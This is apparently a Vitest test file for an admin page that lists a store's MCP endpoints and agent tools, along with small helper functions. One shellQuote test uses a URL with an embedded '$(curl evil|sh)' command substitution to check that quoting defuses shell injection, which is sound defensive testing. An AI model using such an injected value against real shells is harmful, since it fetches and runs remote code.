import { fireEvent, screen } from '@testing-library/react'
import { describe, expect, it } from 'vitest'
import '@testing-library/jest-dom/vitest'
import { globalScope, renderPage } from '@/test/page-harness'
import { McpOverviewDocument } from './Mcp.gql'
import { McpPage } from './McpPage'
import { adminMcpUrl, firstSentence, shellQuote, storefrontStatus } from './mcp'

const store = { ...globalScope, scope: { mode: 'CHANNEL' as const, channelId: 'ch1', locale: '' }, isGlobal: false, isChannel: true, effectiveChannelId: 'ch1', selectedChannel: { id: 'ch1', name: 'Main' } } as typeof globalScope

const tool = (name: string, description: string) => ({ __typename: 'McpTool', name, description })

const overview = (storefront: { available: boolean; enabled: boolean; url: string | null }) => ({
  request: { query: McpOverviewDocument, variables: { channelId: 'ch1' } },
  result: {
    data: {
      mcpOverview: {
        __typename: 'McpOverview',
        storefront: { __typename: 'StorefrontMcp', ...storefront, tools: [tool('search_products', 'Search the catalog. Every argument is optional.')] },
        admin: { __typename: 'AdminMcp', available: true, path: '/api/admin/mcp', tools: [tool('sales_summary', 'Revenue and orders.')] },
      },
    },
  },
})

describe('McpPage', () => {
  it('gives both addresses for the store, and lists what agents can do', async () => {
    renderPage({ path: '/mcp', routes: { '/mcp': <McpPage /> }, mocks: [overview({ available: true, enabled: true, url: 'https://shop.example/api/mcp' })], scope: store })
    expect(await screen.findByText('https://shop.example/api/mcp')).toBeInTheDocument()
    expect(screen.getByText(/^Any AI agent can shop .+ here\.$/)).toBeInTheDocument()
    expect(screen.getByText(adminMcpUrl('/api/admin/mcp'))).toBeInTheDocument()
    expect(screen.getByText(/X-Channel-Id: ch1/)).toBeInTheDocument()
    fireEvent.click(screen.getByRole('button', { name: /What a shopper's agent can do/ }))
    expect(await screen.findByText('Search the catalog.')).toBeInTheDocument()
  })

  it('sends a store with no public URL to its channel instead of giving an address', async () => {
    renderPage({ path: '/mcp', routes: { '/mcp': <McpPage /> }, mocks: [overview({ available: true, enabled: true, url: null })], scope: store })
    expect(await screen.findByRole('link', { name: /public URL/ })).toHaveAttribute('href', '/channels/ch1')
    expect(screen.getByText(/^Shoppers' agents can't reach .+ yet\.$/)).toBeInTheDocument()
    expect(screen.queryByText(/claude mcp add --transport http shop/)).not.toBeInTheDocument()
  })
})

describe('storefrontStatus', () => {
  it('names the first thing keeping agents out', () => {
    expect(storefrontStatus({ available: false, enabled: true, url: 'u', tools: [] }).why).toMatch(/MCP_FRONT_ENABLED/)
    expect(storefrontStatus({ available: true, enabled: false, url: null, tools: [] }).why).toMatch(/public URL/)
    expect(storefrontStatus({ available: true, enabled: false, url: 'u', tools: [] }).why).toMatch(/settings/)
    expect(storefrontStatus({ available: true, enabled: true, url: 'u', tools: [] }).on).toBe(true)
  })
})

describe('helpers', () => {
  it('keeps a description to its first sentence', () => {
    expect(firstSentence('One. Two.')).toBe('One.')
    expect(firstSentence('v1.2 is out. Then more')).toBe('v1.2 is out.')
    expect(firstSentence('no stop')).toBe('no stop')
  })
  it('quotes a value so a shell reads none of it', () => {
    expect(shellQuote('https://shop.example/api/mcp')).toBe("'https://shop.example/api/mcp'")
    expect(shellQuote("https://x$(curl evil|sh)/it's")).toBe("'https://x$(curl evil|sh)/it'\\''s'")
  })
  it('puts the admin path on the API host', () => {
    expect(adminMcpUrl('/api/admin/s3cret-slug/mcp', 'https://admin.example')).toBe('https://admin.example/api/admin/s3cret-slug/mcp')
  })
})
